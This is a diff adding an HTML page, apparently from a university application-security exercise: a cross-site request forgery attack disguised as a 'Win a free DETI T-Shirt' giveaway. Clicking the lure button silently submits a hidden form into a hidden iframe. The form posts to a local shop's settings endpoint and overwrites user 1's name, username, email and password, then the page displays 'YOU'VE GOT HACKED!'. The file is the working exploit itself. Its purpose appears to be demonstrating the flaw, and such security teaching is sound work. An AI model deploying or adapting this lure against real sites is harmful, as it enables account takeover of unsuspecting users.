@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>DETI Ecommerce Shop</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+    <style>
+
+        .contain {
+            display: flex;
+            flex-direction: column;
+            margin: 0 auto;
+            width: 60%;
+            padding: 10rem;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .buttn:hover {
+            background-color: #0baccc;
+            color: white;
+            translate: 0px -5px;
+            transform: 0.5s;
+        }
+
+        .backdrop {
+            background-image: url("https://deti-cdn.clients.ua.pt/wp-content/uploads/2018/02/P7240001_2.png");
+            background-size: 100%;
+            height: 100vh;
+            z-index: -10;
+        }
+
+        .blur {
+            background: (255 255 255 / 0.2);
+            backdrop-filter: blur(10px);
+            height: 100dvh;
+            width: 100%;
+        }
+    </style>
+</head>
+<body style="overflow-y: hidden;" class="backdrop">
+    <form hidden id="hack" target="csrf-frame" action="http://localhost:5000/settings?user=1" method="POST" autocomplete="off">
+
+        <input type="text" class="form-control" name="first_name" id="first_name" placeholder="First Name" value="Totally">
+
+        <input type="text" class="form-control" name="last_name" id="last_name" placeholder="Last Name" value="Hacked">
+
+        <input type="text" class="form-control" name="username" id="username" placeholder="Username" value="zzz">
+
+        <input type="text" class="form-control" name="email" id="email" placeholder="Email" value="Sorry Bro">
+
+        <input type="password" class="form-control" name="password" id="password" placeholder="Password" value="you've done it right this time">
+
+        <input type="text" class="form-control" name="description" id="description" placeholder="Description" value="Nice One">
+
+        <input type="text" class="form-control" name="phone_number" id="phone_number" placeholder="Phone Number" value="432785198">
+
+    </form>
+
+    <iframe hidden name="csrf-frame" id="frame" width="1000px" height="1000px"></iframe>
+    <div class="blur">
+        <div class="contain">
+            <h1>Win a free DETI T-Shirt</h1>
+            <h3 style="margin-bottom: 10px;">Win a free DETI T-Shirt without having to pay for it!</h3>
+            <img src="/app_sec/static/products/1.png" style="width: 300px; margin-left: 250px; margin-bottom: 30px;">
+            <button onclick="hack();" type="button" id="button" class="text-center btn btn-success"> Click Here to Win!</button>
+            <br />
+
+            <div id="warning"></div>
+        </div>
+    </div>
+
+    <script>
+        function hack() {
+            document.getElementById("hack").submit();
+            document.getElementById("warning").innerHTML = "YOU'VE GOT HACKED!";
+            console.log(document.getElementById("frame"));
+        }
+    </script>
+    
+</body>
+</html>
